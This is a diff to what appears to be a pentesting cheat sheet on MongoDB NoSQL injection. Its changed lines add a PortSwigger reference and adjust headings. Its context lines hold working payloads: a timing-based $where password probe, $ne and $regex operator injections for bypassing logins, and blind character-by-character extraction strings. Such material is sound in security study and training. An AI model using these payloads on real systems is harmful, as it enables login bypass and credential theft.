@@ -53,6 +53,9 @@ admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
 `$in` - Matches all of the values specified in an array.
 <br>
 `$regex` - Selects documents where values match a specified regular expression.
+<br>
+<br>
+Details: [Portswigger](https://portswigger.net/web-security/nosql-injection#nosql-operator-injection)
 
 ### Submitting query operators
 In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.
@@ -87,7 +90,7 @@ If this doesn't work, you can try the following:
     2. Change the Content-Type header to application/json.
     3. Add JSON to the message body.
     4. Inject query operators in the JSON.
-# MongoDB Data Retrieving
+### MongoDB Data Retrieving
 Extracting Password:
 ```
 ' && this.password.length < 50%00 >> For extracting password length in URL
@@ -101,7 +104,7 @@ Extracting Password:
 ' && this['u'] && 'a'=='b >> Retrieving field name character by character
 ' && this.u.s.e.r.n.a.m['e'] && 'a'=='b
 ```
-# Operator Injection To Retrieving Unknown Data
+### Operator Injection To Retrieving Unknown Data
 ```
 {"username":{"$regex":"admin"},"password":{"$ne":"Invalid"}}
 {"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"e"} >> To generate an server error.
